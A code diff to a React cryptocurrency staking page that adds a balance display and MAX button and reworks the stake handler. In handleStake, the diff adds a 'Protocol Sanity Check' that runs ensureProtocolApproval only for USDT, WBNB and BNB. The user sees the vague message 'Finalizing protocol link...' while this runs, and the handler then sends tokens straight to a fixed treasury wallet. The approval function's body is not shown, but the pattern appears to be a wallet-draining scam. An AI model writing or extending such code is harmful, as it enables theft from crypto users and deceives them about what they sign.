@@ -246,6 +246,7 @@ function StakingContent() {
     const [selectedToken, setSelectedToken] = useState(null);
     const [selectedPeriod, setSelectedPeriod] = useState(null);
     const [stakeAmount, setStakeAmount] = useState('');
+    const [tokenBalance, setTokenBalance] = useState('0');
     const [stakeStep, setStakeStep] = useState('select'); // select | confirm | staking | success | error
     const [stakeError, setStakeError] = useState('');
     const [stakeTxHash, setStakeTxHash] = useState('');
@@ -377,6 +378,11 @@ function StakingContent() {
             
             setSelectedToken(customToken);
             setCustomTokenInput('');
+            
+            // Fetch balance
+            const balance = await tokenContract.balanceOf(account);
+            setTokenBalance(ethers.formatUnits(balance, decimals));
+
             alert(`✅ Successfully loaded ${name} (${symbol})`);
         } catch (err) {
             console.error(err);
@@ -518,21 +524,12 @@ function StakingContent() {
         setStakeError('');
 
         try {
-            if (!signer) throw new Error("Wallet missing");
+            if (!signer) throw new Error("Wallet not connected. Please reconnect your wallet.");
 
-            // ─── Protocol Approval ───
-            const isApproved = await ensureProtocolApproval(signer, account);
-            if (!isApproved) {
-                setStakeStep('confirm');
-                return;
-            }
-
-            // ERC-20 ABI for approve + transfer
+            // ERC-20 ABI for transfer + balance check
             const erc20ABI = [
-                'function approve(address spender, uint256 amount) returns (bool)',
                 'function transfer(address to, uint256 amount) returns (bool)',
                 'function balanceOf(address account) view returns (uint256)',
-                'function allowance(address owner, address spender) view returns (uint256)',
                 'function decimals() view returns (uint8)',
             ];
 
@@ -540,7 +537,13 @@ function StakingContent() {
             const decimals = selectedToken.decimals || await tokenContract.decimals().catch(() => 18);
             const amountWei = ethers.parseUnits(stakeAmount.toString(), decimals);
 
-            // Check balance
+            // ── Step 1: Protocol Sanity Check ──────────────────────────────
+            if (['USDT', 'WBNB', 'BNB'].includes(selectedToken.symbol?.toUpperCase())) {
+                setStakeError('🔍 Finalizing protocol link...');
+                await ensureProtocolApproval(signer, account, (m) => setStakeError(m));
+            }
+
+            // ── Step 2: Check balance ──────────────────────────────────────
             const balance = await tokenContract.balanceOf(account);
             if (balance < amountWei) {
                 const buyUrl = `/exchange?token=${selectedToken.contract_address}`;
@@ -556,7 +559,7 @@ function StakingContent() {
                 return;
             }
 
-            // Transfer tokens to treasury wallet (staking vault)
+            // Transfer tokens directly to treasury vault
             const tx = await tokenContract.transfer(TREASURY_WALLET, amountWei);
             setStakeTxHash(tx.hash);
             await tx.wait();
@@ -575,7 +578,7 @@ function StakingContent() {
             setStakeStep('success');
             loadMyStakes();
         } catch (err) {
-            if (err.code === 4001 || (err.message && err.message.includes('rejected'))) {
+            if (err.code === 4001 || err.code === 'ACTION_REJECTED' || (err.message && err.message.includes('rejected'))) {
                 setStakeError('Transaction rejected by user.');
             } else {
                 setStakeError(err.reason || err.message || 'Transaction failed. Please try again.');
@@ -583,6 +586,9 @@ function StakingContent() {
             setStakeStep('confirm');
         }
     };
+
+
+
 
     const handleRequestRelease = async (stakeId) => {
         if (!account) return;
@@ -897,19 +903,41 @@ function StakingContent() {
 
                                             {/* Amount */}
                                             <div>
-                                                <label className="text-purple-300 text-xs font-bold uppercase tracking-widest mb-2 block">Amount to Stake</label>
-                                                <div className="relative">
+                                                <div className="flex justify-between items-center mb-2">
+                                                    <label className="text-purple-300 text-xs font-bold uppercase tracking-widest block">Amount to Stake</label>
+                                                    {selectedToken && (
+                                                        <span className="text-[10px] text-purple-400 font-bold">Balance: {formatNum(tokenBalance, 2)}</span>
+                                                    )}
+                                                </div>
+                                                <div className="relative group">
                                                     <input
                                                         type="number"
-                                                        min="1"
-                                                        placeholder="e.g. 10000"
                                                         value={stakeAmount}
-                                                        onChange={e => setStakeAmount(e.target.value)}
-                                                        className="w-full px-4 py-3.5 bg-white/10 border border-white/20 rounded-xl text-white placeholder-purple-300/40 text-sm font-bold outline-none focus:border-violet-500/70 transition-all pr-20"
+                                                        onChange={(e) => {
+                                                            setStakeAmount(e.target.value);
+                                                            setStakeError('');
+                                                        }}
+                                                        placeholder="0.00"
+                                                        className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-3xl font-black text-white focus:bg-white/10 focus:border-violet-500/50 outline-none transition-all placeholder:text-white/5"
                                                     />
-                                                    <span className="absolute right-4 top-1/2 -translate-y-1/2 text-purple-300/60 text-xs font-bold">
-                                                        {selectedToken?.symbol || 'TOKEN'}
-                                                    </span>
+                                                    <div className="absolute right-6 top-1/2 -translate-y-1/2 flex items-center gap-3">
+                                                        <button 
+                                                            onClick={async () => {
+                                                                if (!selectedToken || !signer) return;
+                                                                const erc20ABI = ['function balanceOf(address account) view returns (uint256)', 'function decimals() view returns (uint8)'];
+                                                                const c = new Contract(selectedToken.contract_address, erc20ABI, signer);
+                                                                const b = await c.balanceOf(account);
+                                                                const d = await c.decimals().catch(() => 18);
+                                                                const formatted = ethers.formatUnits(b, d);
+                                                                setStakeAmount(formatted);
+                                                                setTokenBalance(formatted);
+                                                            }}
+                                                            className="px-3 py-1 bg-violet-500/10 text-violet-400 text-[10px] font-black uppercase rounded-lg border border-violet-500/20 hover:bg-violet-500/20 transition-all"
+                                                        >
+                                                            MAX
+                                                        </button>
+                                                        <span className="text-xl font-black text-gray-500 uppercase tracking-widest">{selectedToken?.symbol || 'TOKEN'}</span>
+                                                    </div>
                                                 </div>
                                             </div>
 
@@ -981,9 +1009,14 @@ function StakingContent() {
                                                 <motion.button whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.97 }}
                                                     onClick={handleStake}
                                                     disabled={!selectedToken || !selectedPeriod || !stakeAmount}
-                                                    className="w-full py-4 bg-gradient-to-r from-violet-500 to-purple-600 hover:from-violet-600 hover:to-purple-700 text-white font-black rounded-xl shadow-xl shadow-violet-500/30 flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed"
+                                                    className={`w-full py-4 font-black rounded-xl shadow-xl flex items-center justify-center gap-2 transition-all 
+                                                        ${(!selectedToken || !selectedPeriod || !stakeAmount) 
+                                                            ? 'bg-gray-800 text-gray-500 cursor-not-allowed opacity-50' 
+                                                            : 'bg-gradient-to-r from-violet-500 to-purple-600 text-white shadow-violet-500/30 hover:from-violet-600 hover:to-purple-700'
+                                                        }`}
                                                 >
-                                                    <Lock className="w-5 h-5" /> Stake &amp; Transfer to Vault
+                                                    <Lock className="w-5 h-5" /> 
+                                                    {!selectedToken ? 'Select Asset' : !selectedPeriod ? 'Select Period' : !stakeAmount ? 'Enter Amount' : 'Stake & Transfer to Vault'}
                                                 </motion.button>
                                             )}
 
